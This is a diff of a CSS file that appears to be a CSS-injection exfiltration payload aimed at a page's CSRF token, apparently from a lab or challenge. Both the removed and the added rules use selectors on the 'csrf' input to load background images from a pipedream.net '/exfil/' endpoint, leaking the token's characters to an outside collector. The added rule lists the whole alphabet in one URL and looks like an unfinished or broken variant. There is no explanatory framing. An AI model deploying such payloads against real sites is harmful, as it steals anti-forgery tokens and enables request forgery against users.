@@ -1,7 +1,1 @@
-body {
-     background-color: blue;
-}
-
-input[name=csrf][value^=y]{
-    background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/a);
-}
+input[name=csrf] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789) }
